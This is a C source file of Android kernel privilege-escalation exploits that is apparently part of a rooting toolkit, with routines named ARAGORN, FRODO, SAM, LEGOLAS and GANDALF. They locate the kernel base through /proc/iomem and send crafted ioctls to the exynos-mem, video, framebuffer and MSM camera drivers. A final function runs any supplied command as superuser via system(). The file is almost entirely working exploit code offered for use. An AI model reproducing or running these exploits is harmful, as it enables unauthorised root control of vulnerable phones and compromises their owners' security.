#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <stdbool.h>
#include "exploit.h"
#include <linux/fb.h>

#define EXYNOS_MEM_PADDR_CACHE_FLUSH    0x40084dc9 // Defined as _IOW('M', 201, struct exynos_mem_flush_range) in exynos-mem.h
#define VIDIOC_G_FMT                    0xc0cc5604 // Defined as _IOWR('V',  4, struct v4l2_format) in videodev2.h
#define VIDIOC_REQBUFS                  0xc0145608 // Defined as _IOWR('V',  8, struct v4l2_requestbuffers) in videodev2.h
#define VIDIOC_S_CTRL                   0xc008561c // Defined as _IOWR('V', 28, struct v4l2_control) in videode2.h
#define MSM_CAM_IOCTL_SET_MEM_MAP_INFO  0x80046d29


int set_offset(struct exploit *exp) {
  FILE *fd;
  char *ptr;
  char line[512];
  char *str;
  char *str2;
  unsigned long addr = 0;

  /* Check /dev/iomem for "System RAM" symbol. */
  /* Kernel code base address is our target.   */

  if(!exp)
    return 0;

  if(!(fd = fopen("/proc/iomem", "r"))) {
      printf("Unable to open proc\n");
      return 0;
  }

  while((ptr = fgets(line, sizeof(line), fd))) {
    str = strtok(ptr, ":");
    if(str2 = strtok(0, ":")) {
      if(strstr(str2, "System RAM")) {
	  str = strtok(str, "-");
	  addr = strtoul(str, NULL ,16);
	  if(ptr = fgets(line, sizeof(line), fd)) {
	    if(strstr(line, "Kernel code") || strstr(line, "Kernel text")) {
	      break;
	    }
	  }
      }
    }	
  }

  fclose(fd);

  if(!addr) 
    return 0;

  // Update the value
  exp->offset = addr;

  return 1;

}



int sleep_func(struct exploit *exp) {

  sleep(5);
  return 1;

}



// Init function for ARAGORN exploit on /dev/video1 device
int init_aragorn(struct exploit *exp) {

  int fd = exp->fd;
  unsigned long offset;

  struct v412_format {
    int  type;
    char raw_data[200];
  };


  struct v4l2_requestbuffers {
    int count;
    int type;
    int memory;
    int reserved[2];
  };


  struct v4l2_control {
    int            id;
    unsigned long *value;
  };


  if(!fd)
    return 0;

  if(!set_offset(exp))
    return 0;

  struct v412_format arg1;
  memset((void *) &arg1, 0, sizeof(arg1));
  arg1.type = 2; // Video type = Video Output

  struct v4l2_requestbuffers arg2 = {
    1,
    2, // V4L2_BUF_TYPE_VIDEO_OUTPUT 
    0, 
    0, 
    0
  };
 
  offset = exp->offset;
  struct v4l2_control arg3 = {0x800000A, &offset};

  // Device I/O specific request
    
  if(ioctl(fd, VIDIOC_G_FMT, &arg1)) {
    return 0;
  }

  if(ioctl(fd, VIDIOC_REQBUFS, &arg2)) {
    return 0;
  }

  if(ioctl(fd, VIDIOC_S_CTRL, &arg3)) {
    return 0;
  }

  exp->offset = 0;

  return 1;

}



// Finalize function for SAM and FRODO exploit on /dev/exynos-mem
int finalize_exynos(struct exploit *exp) {


  struct exynos_mem_flush_range {
    unsigned long start;
    size_t length;
  };

  
  unsigned long offset;
  
  offset = exp->offset;
  struct exynos_mem_flush_range args = {(unsigned long) &offset, exp->length};

  if(exp->fd) {
    if(!ioctl(exp->fd, EXYNOS_MEM_PADDR_CACHE_FLUSH, &args))
      return 1;
  }

  // Should be never reached
  return 0;
}



// Init func for FRODO exploit on /dev/exynos-mem
int init_frodo(struct exploit *exp) {

  unsigned long offset;
  unsigned long new_offset;

  offset = exp->offset;
  if(!set_offset(exp))
    return 0;

  new_offset = (exp->offset >> 2) + 1024;
  exp->start_offset = new_offset;
  exp->offset = offset;

  return 1;
}



// Init func for LEGOLAS exploit on /dev/graphics/fb0
int init_legolas(struct exploit *exp) {
  unsigned long offset;

  if(!set_offset(exp))
    return 0;

  offset = exp->offset;
  exp->offset = 0;

  if(ioctl(exp->fd, 0x40044734, (void *) offset)) 
    return 0;

  return 1;
}

// Pre init func for GANDALF exploit
int pre_init_gandalf(struct exploit *exp) {
  int fd;

  if(!set_offset(exp))
    return 0;

  fd = open("/dev/video0", O_RDWR);

  if(fd < 0)
    return 0;

  exp->fd2 = fd;
  close(fd);
  
  fd = open("/dev/video0", O_RDWR);

  if(fd < 0)
    return 0;

  exp->fd2 = fd;
  
  return 1;

}


// Init func for GANDALF exploit
int init_gandalf(struct exploit *exp) {

  struct msm_mem_map_info {
    unsigned long offset;
    int           length;
    int           mem_type;
  };


  struct msm_mem_map_info args = {exp->offset, 0, 0};
  exp->offset = 0;

  if(ioctl(exp->fd, MSM_CAM_IOCTL_SET_MEM_MAP_INFO, &args) < 0)
    return 0;

  return 1;
}



// Exec the payload as superuser
void exec_payload(int args, char **cmd) {
  char exec[128];
  int i;
  
  memset(exec, 0, sizeof(exec));
  snprintf(exec, sizeof(exec), "%s", cmd[1]);

  for(i = 2; i < args; i++)
    snprintf(exec, sizeof(exec), "%s %s", exec, cmd[i]);

  /* PUT HERE YOUR PRIVILEGED CODE TO BE EXECUTED */
  system(exec);

}
